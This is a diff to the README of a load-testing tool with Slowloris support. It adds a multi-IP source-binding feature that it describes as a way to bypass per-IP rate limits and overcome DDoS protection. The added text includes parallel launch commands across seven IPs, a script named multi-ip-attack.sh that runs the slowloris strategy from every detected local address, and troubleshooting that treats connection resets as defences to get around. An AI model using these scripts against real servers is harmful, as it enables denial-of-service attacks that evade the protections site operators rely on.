@@ -22,6 +22,12 @@ High-performance load testing tool with Slowloris attack support and advanced me
   - TCP session accuracy (goroutines vs real sockets)
   - Connection lifetime, timeout, and reconnect telemetry
 
+- **Multi-IP Source Binding**
+  - Bind outbound connections to specific network interfaces
+  - Bypass single-IP rate limits on target servers
+  - Distribute load across multiple NICs or IP addresses
+  - Essential for overcoming DDoS protection thresholds
+
 - **Production Ready**
   - Session lifetime limits (5min max)
   - Graceful shutdown
@@ -65,6 +71,9 @@ make build
 
 # Slowloris simulation
 ./loadtest --target http://example.com --strategy slowloris --sessions 500 --rate 50
+
+# Bind to specific source IP
+./loadtest --target http://example.com --sessions 2000 --rate 500 --bind-ip 192.168.1.101
 ```
 
 ## Command Line Options
@@ -72,14 +81,15 @@ make build
 | Flag | Default | Description |
 |------|---------|-------------|
 | `--target` | (required) | Target URL (http:// or https://) |
-| `--strategy` | `normal` | Attack strategy (`normal` or `slowloris`) |
+| `--strategy` | `keepalive` | Attack strategy (`normal`, `keepalive`, or `slowloris`) |
 | `--sessions` | `100` | Target concurrent sessions |
 | `--rate` | `10` | Sessions per second to create |
 | `--duration` | `0` (infinite) | Test duration (e.g., `30s`, `5m`, `1h`) |
 | `--rampup` | `0` | Ramp-up duration for gradual load increase |
+| `--bind-ip` | `` | Source IP address to bind outbound connections to |
 | `--method` | `GET` | HTTP method |
 | `--timeout` | `10s` | Request timeout |
-| `--keepalive` | `10s` | Slowloris keep-alive interval |
+| `--keepalive` | `10s` | Keep-alive ping interval |
 
 ## Examples
 
@@ -147,6 +157,32 @@ Status:          ✓ Within target (±10%)
   --duration 30s
 ```
 
+### 5. Multi-IP Load Distribution
+
+```bash
+# Single IP (limited to ~2,400 sessions by target DDoS protection)
+./loadtest \
+  --target http://example.com \
+  --sessions 2000 \
+  --rate 500
+
+# Bind to specific NIC to bypass rate limits
+./loadtest \
+  --target http://example.com \
+  --sessions 2000 \
+  --rate 500 \
+  --bind-ip 192.168.1.101
+
+# Multiple IPs (manual distribution across 7 NICs = ~14,000 total sessions)
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.101 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.102 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.103 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.104 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.105 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.106 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.107 &
+```
+
 ## Performance Targets
 
 On a modern system (4 CPU cores, 8GB RAM):
@@ -158,13 +194,24 @@ On a modern system (4 CPU cores, 8GB RAM):
 | 5,000 | 500/s | ~300MB | 40-60% | 30s |
 | 10,000 | 1000/s | ~600MB | 80-100% | 1m |
 
+### Single IP Limitations
+
+Most target servers implement DDoS protection with per-IP connection limits:
+
+| Scenario | Single IP | Multi-IP (7 NICs) |
+|----------|-----------|-------------------|
+| Target allows 2,400/IP | 2,400 sessions | ~16,800 sessions |
+| Target allows 5,000/IP | 5,000 sessions | ~35,000 sessions |
+
 ## Understanding Metrics
 
 ### Percentiles (p50, p95, p99)
 
-- **p50 (Median)**: 50% of requests were at or below this rate
-- **p95**: 95% of requests were at or below this rate (typical SLA)
-- **p99**: 99% of requests were at or below this rate (tail latency)
+- **p50 (Median)**: 50% of sampled seconds were at or below this throughput
+- **p95**: 95% of sampled seconds were at or below this throughput (typical SLA)
+- **p99**: 99% of sampled seconds were at or below this throughput (tail latency)
+
+> **Note:** `Requests/sec`, standard deviation, and percentile calculations are derived from successful requests only. Failed attempts are still counted in the Success/Failed totals but are excluded from the per-second throughput window that feeds these metrics.
 
 ### Why Percentiles Matter
 
@@ -191,6 +238,147 @@ p99: 200 req/s  ← Rare but important outliers
 > ./loadtest --target http://httpbin.org/get --sessions 50 --rate 50 --duration 30s
 > ```
 > TCP Connections 값이 45~55 범위(±10%)를 유지하면 Keep-Alive 기반 세션 유지가 정상적으로 이루어지고 있음을 의미합니다.
+
+## Multi-IP Source Binding
+
+### Why Use Multiple Source IPs?
+
+Target servers typically implement per-IP rate limiting as DDoS protection:
+
+```
+Single IP:     2,400 sessions max (rate limited)
+7 IPs (NICs):  16,800 sessions (2,400 × 7)
+100 IPs:       240,000 sessions (2,400 × 100)
+```
+
+### When You Need Multi-IP
+
+**Symptoms of IP-based rate limiting:**
+- Sessions plateau at ~2,000-3,000 despite higher `--sessions` setting
+- `netstat` shows high connection resets (RST packets)
+- Target server logs show "rate limit exceeded" or "too many connections"
+
+**Example:**
+```bash
+# Setting: 5,000 sessions
+./loadtest --target http://example.com --sessions 5000 --rate 500
+
+# Actual: Only 2,400 sessions established
+# netstat shows: 113,195 connection resets
+
+# Solution: Use multiple source IPs
+```
+
+### How to Use bind-ip
+
+**1. Check Available Network Interfaces:**
+
+```bash
+# Linux/Mac
+ip addr show
+
+# Expected output:
+# eth0: 192.168.1.101
+# eth1: 192.168.1.102
+# eth2: 192.168.1.103
+# ...
+```
+
+**2. Single IP Binding:**
+
+```bash
+./loadtest \
+  --target http://example.com \
+  --sessions 2000 \
+  --rate 500 \
+  --bind-ip 192.168.1.101
+```
+
+**3. Multi-IP Manual Distribution:**
+
+```bash
+# Launch separate processes for each NIC
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.101 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.102 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.103 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.104 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.105 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.106 &
+./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.107 &
+
+# Monitor all processes
+watch -n 1 'ps aux | grep loadtest | wc -l'
+```
+
+**4. Automated Multi-IP Script:**
+
+```bash
+#!/bin/bash
+# multi-ip-attack.sh
+
+TARGET="http://example.com"
+SESSIONS=2000
+RATE=500
+STRATEGY="slowloris"
+
+# Automatically detect all available IPs
+IPS=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d'/' -f1)
+
+echo "Detected IPs:"
+echo "$IPS"
+echo ""
+
+# Launch one process per IP
+for ip in $IPS; do
+    echo "Starting with IP: $ip"
+    ./loadtest \
+        --target "$TARGET" \
+        --sessions "$SESSIONS" \
+        --rate "$RATE" \
+        --strategy "$STRATEGY" \
+        --bind-ip "$ip" &
+    sleep 1
+done
+
+echo "All processes launched. Press Ctrl+C to stop."
+wait
+```
+
+### Verification
+
+```bash
+# Check which IPs are being used
+netstat -an | grep ESTABLISHED | awk '{print $4}' | cut -d':' -f1 | sort | uniq -c
+
+# Expected output with 7 IPs:
+#   342 192.168.1.101
+#   341 192.168.1.102
+#   339 192.168.1.103
+#   344 192.168.1.104
+#   338 192.168.1.105
+#   342 192.168.1.106
+#   341 192.168.1.107
+
+# Total: ~2,387 sessions across 7 IPs
+```
+
+### Important Notes
+
+**IP Binding vs IP Spoofing:**
+- `--bind-ip` uses **real, assigned IP addresses** (legitimate)
+- IP spoofing uses **fake IPs** (illegal, immediately detected)
+- Always use bind-ip with actual network interfaces
+
+**Per-IP Session Limits:**
+- Most servers: 2,000-3,000 sessions/IP
+- High-security servers: 500-1,000 sessions/IP
+- CDNs: 5,000-10,000 sessions/IP
+
+**Performance Impact:**
+- Binding overhead: <1% CPU
+- No meaningful performance degradation
+- Bottleneck is network bandwidth, not IP binding
+
 ## AWS Deployment
 
 ### Quick Deploy
@@ -276,7 +464,7 @@ Slowloris strategy automatically rotates through 10 realistic User-Agents:
 ### TLS/HTTPS Support
 
 - Proper TLS handshake
-- Certificate validation (configurable)
+- Certificate validation enforced (self-signed certs will fail unless trusted by the OS)
 - SNI support
 - Works with modern HTTPS servers
 
@@ -323,6 +511,20 @@ While running LoadTestForge, monitor your target:
 - Database connections
 - Network bandwidth
 
+### 5. Use Multi-IP for High Session Counts
+
+```bash
+# If single IP plateaus at 2,400 sessions
+./loadtest --target http://api.com --sessions 5000 --rate 500
+# Actual: 2,400 sessions (IP rate limited)
+
+# Solution: Distribute across multiple IPs
+for i in {1..7}; do
+    ./loadtest --target http://api.com --sessions 2000 --bind-ip 192.168.1.10$i &
+done
+# Actual: 14,000 sessions (2,000 × 7)
+```
+
 ## Troubleshooting
 
 ### High p99 values
@@ -347,6 +549,36 @@ ulimits:
   nofile:
     soft: 65536
     hard: 65536
+```
+
+### Sessions plateau below target
+
+**Problem:** Can't exceed 2,000-3,000 sessions on single IP.
+
+**Diagnosis:**
+```bash
+netstat -s | grep -i reset
+# High reset count = IP rate limiting
+```
+
+**Solution:**
+```bash
+# Use multiple source IPs
+./loadtest --bind-ip 192.168.1.101 --sessions 2000 &
+./loadtest --bind-ip 192.168.1.102 --sessions 2000 &
+# ...
+```
+
+### Invalid bind IP error
+
+**Problem:** `Error: invalid bind IP: 192.168.1.999`
+
+**Solution:**
+```bash
+# Verify IP is assigned to a network interface
+ip addr show | grep 192.168.1
+
+# Only use IPs that appear in the output
 ```
 
 ### Ramp-up not smooth
